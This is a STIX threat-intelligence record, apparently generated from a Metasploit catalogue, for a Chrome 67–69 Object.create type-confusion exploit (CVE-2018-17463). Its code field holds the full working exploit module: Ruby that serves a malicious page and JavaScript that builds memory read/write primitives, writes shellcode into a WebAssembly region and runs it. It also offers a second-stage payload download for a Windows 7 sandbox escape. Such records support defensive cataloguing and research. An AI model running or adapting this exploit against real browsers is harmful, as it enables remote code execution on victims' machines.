{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--da5dade9-09bb-422f-87a3-3218b9e67ae4",
    "created": "2024-08-14T17:06:15.858177Z",
    "modified": "2024-08-14T17:06:15.858181Z",
    "name": "Google Chrome 67, 68 and 69 Object.create exploit",
    "description": " This modules exploits a type confusion in Google Chromes JIT compiler. The Object.create operation can be used to cause a type confusion between a PropertyArray and a NameDictionary. The payload is executed within the rwx region of the sandboxed renderer process. This module can target the renderer process (target 0), but Google Chrome must be launched with the --no-sandbox flag for the payload to execute successfully.",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/browser/chrome_object_create.rb",
            "external_id": "chrome_object_create.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2018-17463"
        },
        {
            "source_name": "reference",
            "url": "http://www.phrack.org/papers/jit_exploitation.html"
        },
        {
            "source_name": "reference",
            "url": "https://ssd-disclosure.com/archives/3783/ssd-advisory-chrome-type-confusion-in-jscreateobject-operation-to-rce"
        },
        {
            "source_name": "reference",
            "url": "https://saelo.github.io/presentations/blackhat_us_18_attacking_client_side_jit_compilers.pdf"
        },
        {
            "source_name": "reference",
            "url": "https://bugs.chromium.org/p/chromium/issues/detail?id=888923"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ManualRanking\n\n  include Msf::Post::File\n  include Msf::Exploit::Remote::HttpServer::BrowserExploit\n  include Msf::Payload::Windows::AddrLoader_x64\n  include Msf::Payload::Windows::ReflectiveDllInject_x64\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Google Chrome 67, 68 and 69 Object.create exploit',\n        'Description' => %q{\n          This modules exploits a type confusion in Google Chromes JIT compiler.\n          The Object.create operation can be used to cause a type confusion between a\n          PropertyArray and a NameDictionary.\n          The payload is executed within the rwx region of the sandboxed renderer\n          process.\n          This module can target the renderer process (target 0), but Google\n          Chrome must be launched with the --no-sandbox flag for the payload to\n          execute successfully.\n          Alternatively, this module can use CVE-2019-1458 to escape the renderer\n          sandbox (target 1). This will only work on vulnerable versions of\n          Windows (e.g Windows 7) and the exploit can only be triggered once.\n          Additionally the exploit can cause the target machine to restart\n          when the session is terminated. A BSOD is also likely to occur when\n          the system is shut down or rebooted.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'saelo', # discovery and exploit\n          'timwr', # metasploit module\n        ],\n        'References' => [\n          ['CVE', '2018-17463'],\n          ['URL', 'http://www.phrack.org/papers/jit_exploitation.html'],\n          ['URL', 'https://ssd-disclosure.com/archives/3783/ssd-advisory-chrome-type-confusion-in-jscreateobject-operation-to-rce'],\n          ['URL', 'https://saelo.github.io/presentations/blackhat_us_18_attacking_client_side_jit_compilers.pdf'],\n          ['URL', 'https://bugs.chromium.org/p/chromium/issues/detail?id=888923'],\n        ],\n        'Arch' => [ ARCH_X64 ],\n        'Platform' => ['windows', 'osx', 'linux'],\n        'DefaultTarget' => 0,\n        'Notes' => {\n          'Reliability' => [ REPEATABLE_SESSION ],\n          'SideEffects' => [ IOC_IN_LOGS ],\n          'Stability' => [CRASH_SAFE]\n        },\n        'Targets' => [\n          [\n            'No sandbox escape (--no-sandbox)', {}\n          ],\n          [\n            'Windows 7 (x64) sandbox escape via CVE-2019-1458',\n            {\n              'Platform' => 'win',\n              'Arch' => [ARCH_X64],\n              'DefaultOptions' => { 'InitialAutoRunScript' => 'post/windows/manage/priv_migrate' }\n            }\n          ],\n        ],\n        'DisclosureDate' => '2018-09-25'\n      )\n    )\n    deregister_options('DLL')\n  end\n\n  def library_path\n    File.join(Msf::Config.data_directory, 'exploits', 'CVE-2019-1458', 'exploit.dll')\n  end\n\n  def on_request_uri(cli, request)\n    print_status(\"Sending #{request.uri} to #{request['User-Agent']}\")\n    download_payload = ''\n    shellcode = payload.encoded\n    uripath = datastore['URIPATH'] || get_resource\n    uripath += '/' unless uripath.end_with? '/'\n\n    if target.name.end_with?('CVE-2019-1458')\n      if request.uri.to_s.end_with?('/payload')\n        loader_data = stage_payload\n        pidx = loader_data.index('PAYLOAD:')\n        if pidx\n          loader_data[pidx, payload.encoded.length] = payload.encoded\n        end\n        loader_data += \"\\0\" * (0x20000 - loader_data.length)\n        send_response(cli, loader_data, {\n          'Content-Type' => 'application/octet-stream',\n          'Cache-Control' => 'no-cache, no-store, must-revalidate',\n          'Pragma' => 'no-cache', 'Expires' => '0'\n        })\n        print_good(\"Sent stage2 exploit (#{loader_data.length.to_s(16)} bytes)\")\n      end\n      loader = generate_loader\n      shellcode = loader[0]\n      shellcode_addr_offset = loader[1]\n      shellcode_size_offset = loader[2]\n      download_payload = <<-JS\n    var req = new XMLHttpRequest();\n    req.open('GET', '#{uripath}payload', false);\n    req.overrideMimeType('text/plain; charset=x-user-defined');\n    req.send(null);\n    if (req.status != 200) {\n      return;\n    }\n    let payload_size = req.responseText.length;\n    let payload_array = new ArrayBuffer(payload_size);\n    let payload8 = new Uint8Array(payload_array);\n    for (let i = 0; i < req.responseText.length; i++) {\n      payload8[i] = req.responseText.charCodeAt(i) & 0xff;\n    }\n    let payload_array_mem_addr = memory.addrof(payload_array) + 0x20n;\n    let payload_array_addr = memory.readPtr(payload_array_mem_addr);\n    print('payload addr: 0x' + payload_array_addr.toString(16));\n    uint64View[0] = payload_array_addr;\n    for (let i = 0; i < 8; i++) {\n      shellcode[#{shellcode_addr_offset} + i] = uint8View[i];\n    }\n    for (let i = 0; i < 4; i++) {\n      shellcode[#{shellcode_size_offset} + i] = (payload_size>>(8*i)) & 0xff;\n    }\n    for (let i = 4; i < 8; i++) {\n      shellcode[#{shellcode_size_offset} + i] = 0;\n    }\n      JS\n    end\n\n    jscript = <<~JS\n      let ab = new ArrayBuffer(8);\n      let floatView = new Float64Array(ab);\n      let uint64View = new BigUint64Array(ab);\n      let uint8View = new Uint8Array(ab);\n\n      let shellcode = new Uint8Array([#{Rex::Text.to_num(shellcode)}]);\n\n      Number.prototype.toBigInt = function toBigInt() {\n          floatView[0] = this;\n          return uint64View[0];\n      };\n\n      BigInt.prototype.toNumber = function toNumber() {\n          uint64View[0] = this;\n          return floatView[0];\n      };\n\n      function hex(n) {\n          return '0x' + n.toString(16);\n      };\n\n      function fail(s) {\n          print('FAIL ' + s);\n          throw null;\n      }\n\n      const NUM_PROPERTIES = 32;\n      const MAX_ITERATIONS = 100000;\n\n      function gc() {\n          for (let i = 0; i < 200; i++) {\n              new ArrayBuffer(0x100000);\n          }\n      }\n\n      function make(properties) {\n          let o = {inline: 42}      // TODO\n          for (let i = 0; i < NUM_PROPERTIES; i++) {\n              eval(`o.p${i} = properties[${i}];`);\n          }\n          return o;\n      }\n\n      function pwn() {\n          function find_overlapping_properties() {\n              let propertyNames = [];\n              for (let i = 0; i < NUM_PROPERTIES; i++) {\n                  propertyNames[i] = `p${i}`;\n              }\n              eval(`\n                  function vuln(o) {\n                      let a = o.inline;\n                      this.Object.create(o);\n                      ${propertyNames.map((p) => `let ${p} = o.${p};`).join('\\\\n')}\n                      return [${propertyNames.join(', ')}];\n                  }\n              `);\n\n              let propertyValues = [];\n              for (let i = 1; i < NUM_PROPERTIES; i++) {\n                  propertyValues[i] = -i;\n              }\n\n              for (let i = 0; i < MAX_ITERATIONS; i++) {\n                  let r = vuln(make(propertyValues));\n                  if (r[1] !== -1) {\n                      for (let i = 1; i < r.length; i++) {\n                          if (i !== -r[i] && r[i] < 0 && r[i] > -NUM_PROPERTIES) {\n                              return [i, -r[i]];\n                          }\n                      }\n                  }\n              }\n\n              fail(\"Failed to find overlapping properties\");\n          }\n\n          function addrof(obj) {\n              eval(`\n                  function vuln(o) {\n                      let a = o.inline;\n                      this.Object.create(o);\n                      return o.p${p1}.x1;\n                  }\n              `);\n\n              let propertyValues = [];\n              propertyValues[p1] = {x1: 13.37, x2: 13.38};\n              propertyValues[p2] = {y1: obj};\n\n              let i = 0;\n              for (; i < MAX_ITERATIONS; i++) {\n                  let res = vuln(make(propertyValues));\n                  if (res !== 13.37)\n                      return res.toBigInt()\n              }\n\n              fail(\"Addrof failed\");\n          }\n\n          function corrupt_arraybuffer(victim, newValue) {\n              eval(`\n                  function vuln(o) {\n                      let a = o.inline;\n                      this.Object.create(o);\n                      let orig = o.p${p1}.x2;\n                      o.p${p1}.x2 = ${newValue.toNumber()};\n                      return orig;\n                  }\n              `);\n\n              let propertyValues = [];\n              let o = {x1: 13.37, x2: 13.38};\n              propertyValues[p1] = o;\n              propertyValues[p2] = victim;\n\n              for (let i = 0; i < MAX_ITERATIONS; i++) {\n                  o.x2 = 13.38;\n                  let r = vuln(make(propertyValues));\n                  if (r !== 13.38)\n                      return r.toBigInt();\n              }\n\n              fail(\"Corrupt ArrayBuffer failed\");\n          }\n\n          let [p1, p2] = find_overlapping_properties();\n          print(`Properties p${p1} and p${p2} overlap after conversion to dictionary mode`);\n\n          let memview_buf = new ArrayBuffer(1024);\n          let driver_buf = new ArrayBuffer(1024);\n\n          gc();\n\n          let memview_buf_addr = addrof(memview_buf);\n          memview_buf_addr--;\n          print(`ArrayBuffer @ ${hex(memview_buf_addr)}`);\n\n          let original_driver_buf_ptr = corrupt_arraybuffer(driver_buf, memview_buf_addr);\n\n          let driver = new BigUint64Array(driver_buf);\n          let original_memview_buf_ptr = driver[4];\n\n          let memory = {\n              write(addr, bytes) {\n                  driver[4] = addr;\n                  let memview = new Uint8Array(memview_buf);\n                  memview.set(bytes);\n              },\n              read(addr, len) {\n                  driver[4] = addr;\n                  let memview = new Uint8Array(memview_buf);\n                  return memview.subarray(0, len);\n              },\n              readPtr(addr) {\n                  driver[4] = addr;\n                  let memview = new BigUint64Array(memview_buf);\n                  return memview[0];\n              },\n              writePtr(addr, ptr) {\n                  driver[4] = addr;\n                  let memview = new BigUint64Array(memview_buf);\n                  memview[0] = ptr;\n              },\n              addrof(obj) {\n                  memview_buf.leakMe = obj;\n                  let props = this.readPtr(memview_buf_addr + 8n);\n                  return this.readPtr(props + 15n) - 1n;\n              },\n          };\n\n          // Generate a RWX region for the payload\n          function get_wasm_instance() {\n            var buffer = new Uint8Array([\n              0,97,115,109,1,0,0,0,1,132,128,128,128,0,1,96,0,0,3,130,128,128,128,0,\n              1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,\n              128,128,0,0,7,146,128,128,128,0,2,6,109,101,109,111,114,121,2,0,5,104,\n              101,108,108,111,0,0,10,136,128,128,128,0,1,130,128,128,128,0,0,11\n            ]);\n            return new WebAssembly.Instance(new WebAssembly.Module(buffer),{});\n          }\n      #{download_payload}\n          let wasm_instance = get_wasm_instance();\n          let wasm_addr = memory.addrof(wasm_instance);\n          print(\"wasm_addr @ \" + hex(wasm_addr));\n          let wasm_rwx_addr = memory.readPtr(wasm_addr + 0xe0n);\n          print(\"wasm_rwx @ \" + hex(wasm_rwx_addr));\n\n          memory.write(wasm_rwx_addr, shellcode);\n\n          let fake_vtab = new ArrayBuffer(0x80);\n          let fake_vtab_u64 = new BigUint64Array(fake_vtab);\n          let fake_vtab_addr = memory.readPtr(memory.addrof(fake_vtab) + 0x20n);\n\n          let div = document.createElement('div');\n          let div_addr = memory.addrof(div);\n          print('div_addr @ ' + hex(div_addr));\n          let el_addr = memory.readPtr(div_addr + 0x20n);\n          print('el_addr @ ' + hex(el_addr));\n\n          fake_vtab_u64.fill(wasm_rwx_addr, 6, 10);\n          memory.writePtr(el_addr, fake_vtab_addr);\n\n          print('Triggering...');\n\n          // Trigger virtual call\n          div.dispatchEvent(new Event('click'));\n\n          // We are done here, repair the corrupted array buffers\n          let addr = memory.addrof(driver_buf);\n          memory.writePtr(addr + 32n, original_driver_buf_ptr);\n          memory.writePtr(memview_buf_addr + 32n, original_memview_buf_ptr);\n      }\n\n      pwn();\n    JS\n\n    jscript = add_debug_print_js(jscript)\n    html = %(\n<html>\n<head>\n<script>\n#{jscript}\n</script>\n</head>\n<body>\n</body>\n</html>\n)\n    send_response(cli, html, {\n      'Content-Type' => 'text/html',\n      'Cache-Control' => 'no-cache, no-store, must-revalidate',\n      'Pragma' => 'no-cache', 'Expires' => '0'\n    })\n  end\n\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2018-09-25",
    "x_mitre_platforms": [
        "win'"
    ]
}